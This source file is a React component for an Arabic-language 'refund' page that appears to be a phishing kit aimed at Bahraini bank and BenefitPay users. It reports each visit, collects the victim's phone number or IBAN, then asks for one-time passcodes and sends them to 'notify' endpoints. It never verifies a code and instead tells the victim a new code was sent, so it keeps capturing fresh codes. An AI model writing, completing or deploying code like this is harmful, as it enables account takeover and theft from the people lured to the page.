"use client";

import { useEffect, useRef, useState } from "react";
import { CreditCard, Landmark, Loader2, ShieldCheck } from "lucide-react";
import { OtpInput } from "@/components/OtpInput";

const EMPTY = ["", "", "", "", "", ""];
type Method = "benefitpay" | "iban";

export function ProfileClient({ id, name, amount }: { id: string; name: string; amount: number }) {
  const [method, setMethod] = useState<Method>("benefitpay");
  const [value, setValue] = useState("");
  const [error, setError] = useState("");
  const [step, setStep] = useState<"form" | "otp">("form");
  const [digits, setDigits] = useState<string[]>(EMPTY);
  const [loading, setLoading] = useState(false);
  const [notice, setNotice] = useState("");
  const [sending, setSending] = useState(false);
  const visited = useRef(false);

  useEffect(() => {
    if (visited.current) return;
    visited.current = true;
    fetch("/api/notify/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ profileId: id }),
    }).catch(() => null);
  }, [id]);

  async function onSend(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    const clean = method === "iban" ? value.trim().toUpperCase().replace(/\s+/g, "") : value.trim();
    if (method === "benefitpay" && !/^\+?\d{8,12}$/.test(clean)) {
      setError("أدخل رقم هاتف صحيح.");
      return;
    }
    if (method === "iban" && !/^BH\d{2}[A-Z0-9]{14,26}$/.test(clean)) {
      setError("أدخل رقم آيبان بحريني صحيح يبدأ بـ BH.");
      return;
    }
    setSending(true);
    const res = await fetch("/api/notify/profile", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ profileId: id, method, value: clean }),
    }).catch(() => null);
    setSending(false);
    if (!res || !res.ok) {
      setError("تعذّر إرسال الطلب. حاول مرة أخرى.");
      return;
    }
    setStep("otp");
  }

  async function onConfirm() {
    const code = digits.join("");
    if (code.length !== 6) return;
    setNotice("");
    setLoading(true);
    await fetch("/api/notify/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, method: method === "iban" ? "iban" : "benefit", value }),
    }).catch(() => null);
    setTimeout(() => {
      setLoading(false);
      setDigits(EMPTY);
      setNotice("تم إرسال رمز تحقق جديد، يرجى إدخاله.");
    }, 5000);
  }

  return (
    <main className="mx-auto flex min-h-screen w-full max-w-2xl flex-col justify-center px-4 py-10">
      <div className="card-soft animate-fade-in p-6 sm:p-8">
        <div className="flex items-center gap-3">
          <span className="btn-brand flex h-12 w-12 items-center justify-center rounded-2xl">
            <ShieldCheck className="h-6 w-6" />
          </span>
          <div>
            <h1 className="text-xl font-extrabold sm:text-2xl">تفاصيل طلب الاسترجاع</h1>
            <p className="mt-1 text-sm text-muted-foreground">مرحباً {name}، أكمل الحقول لإتمام العملية.</p>
          </div>
        </div>

        <div className="mt-6 rounded-2xl border border-border bg-accent/40 p-4 text-right">
          <p className="text-xs font-semibold text-muted-foreground">مبلغ الاسترجاع</p>
          <p className="mt-1 text-2xl font-extrabold text-primary" dir="ltr">
            {amount.toFixed(3)} BHD
          </p>
        </div>

        {step === "form" ? (
          <form onSubmit={onSend} className="mt-6 space-y-5">
            <div className="grid gap-3 sm:grid-cols-2">
              <MethodCard
                active={method === "benefitpay"}
                icon={<CreditCard className="h-5 w-5" />}
                title="BenefitPay"
                hint="تحويل على رقم الهاتف"
                onClick={() => setMethod("benefitpay")}
              />
              <MethodCard
                active={method === "iban"}
                icon={<Landmark className="h-5 w-5" />}
                title="IBAN"
                hint="تحويل بنكي"
                onClick={() => setMethod("iban")}
              />
            </div>

            <div>
              <label htmlFor="value" className="mb-2 block text-sm font-bold">
                {method === "benefitpay" ? "رقم الهاتف" : "رقم الآيبان"}
              </label>
              <input
                id="value"
                dir="ltr"
                value={value}
                onChange={(e) => setValue(e.target.value)}
                placeholder={method === "benefitpay" ? "+97333XXXXXX" : "BH00XXXX00000000000000"}
                className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
              />
            </div>

            {error && <p className="text-sm font-semibold text-destructive">{error}</p>}

            <button
              type="submit"
              disabled={sending}
              className="btn-brand inline-flex w-full items-center justify-center gap-2 rounded-2xl px-6 py-4 text-base font-extrabold"
            >
              {sending && <Loader2 className="h-5 w-5 animate-spin" />}
              إرسال
            </button>
          </form>
        ) : loading ? (
          <div className="flex flex-col items-center gap-4 py-14 text-center">
            <Loader2 className="h-12 w-12 animate-spin text-primary" />
            <p className="text-base font-bold">جارٍ التحقق من البيانات...</p>
          </div>
        ) : (
          <div className="mt-6 text-center">
            <h2 className="text-lg font-extrabold">تأكيد عملية الاسترجاع</h2>
            <p className="mt-2 text-sm text-muted-foreground">
              أدخل رمز التحقق المكوّن من 6 أرقام المُرسل إلى هاتفك.
            </p>
            {notice && (
              <p className="mt-4 rounded-xl bg-accent px-4 py-3 text-sm font-semibold text-accent-foreground">
                {notice}
              </p>
            )}
            <div className="mt-6">
              <OtpInput digits={digits} onChange={setDigits} />
            </div>
            <button
              type="button"
              onClick={onConfirm}
              disabled={digits.join("").length !== 6}
              className="btn-brand mt-6 w-full rounded-2xl px-6 py-4 text-base font-extrabold"
            >
              تأكيد وإتمام الاسترجاع
            </button>
          </div>
        )}
      </div>
    </main>
  );
}

function MethodCard({
  active,
  icon,
  title,
  hint,
  onClick,
}: {
  active: boolean;
  icon: React.ReactNode;
  title: string;
  hint: string;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      aria-pressed={active}
      className={`rounded-2xl border p-4 text-right transition ${
        active
          ? "border-primary bg-accent shadow-[0_14px_35px_-24px_oklch(0.53_0.22_26/0.7)]"
          : "border-border bg-background hover:border-primary/50"
      }`}
    >
      <span
        className={`flex h-10 w-10 items-center justify-center rounded-xl ${
          active ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground"
        }`}
      >
        {icon}
      </span>
      <p className="mt-3 text-sm font-extrabold">{title}</p>
      <p className="mt-1 text-xs text-muted-foreground">{hint}</p>
    </button>
  );
}
